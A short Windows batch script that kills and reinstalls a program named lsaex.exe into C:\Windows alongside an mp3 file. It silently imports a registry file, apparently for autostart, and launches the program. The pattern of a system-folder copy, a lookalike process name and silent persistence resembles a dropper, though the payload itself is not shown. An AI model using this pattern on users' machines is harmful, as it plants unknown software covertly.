taskkill /f /im lsaex.exe
ping 127.0.0.1
copy /y lsaex.exe c:\windows\
copy /y demo.mp3 c:\windows\
regedit /s run.reg
start c:\windows\lsaex.exe
pause